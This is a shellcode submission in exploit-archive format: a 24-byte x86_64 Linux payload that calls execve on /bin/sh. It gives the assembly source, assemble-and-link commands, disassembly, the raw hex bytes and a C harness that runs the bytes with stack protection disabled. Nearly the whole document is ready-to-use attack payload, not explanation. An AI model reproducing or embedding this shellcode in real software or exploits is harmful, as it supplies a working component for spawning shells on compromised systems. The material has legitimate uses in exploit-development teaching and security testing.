/*
;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/sh
;Author: m4n3dw0lf
;Github: https://github.com/m4n3dw0lf
;Date: 14/06/2017
;Architecture: Linux x86_64
;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

##########
# Source #
##########

section .text
  global _start
    _start:
      push rax
      xor rdx, rdx
      xor rsi, rsi
      mov rbx,'/bin//sh'
      push rbx
      push rsp
      pop rdi
      mov al, 59
      syscall


#################################
# Compile and execute with NASM #
#################################

nasm -f elf64 sh.s -o sh.o
ld sh.o -o sh

#########################
# objdump --disassemble #
#########################

Disassembly of section .text:

0000000000400080 <_start>:
  400080:	50                   	push   %rax
  400081:	48 31 d2             	xor    %rdx,%rdx
  400084:	48 31 f6             	xor    %rsi,%rsi
  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
  40008e:	2f 73 68
  400091:	53                   	push   %rbx
  400092:	54                   	push   %rsp
  400093:	5f                   	pop    %rdi
  400094:	b0 3b                	mov    $0x3b,%al
  400096:	0f 05                	syscall

######################
# 24 Bytes Shellcode #
######################

\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05

########
# Test #
########

gcc -fno-stack-protector -z execstack shell.c -o shell

*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
main()
{
    int (*ret)() = (int(*)())shellcode;
    ret();
}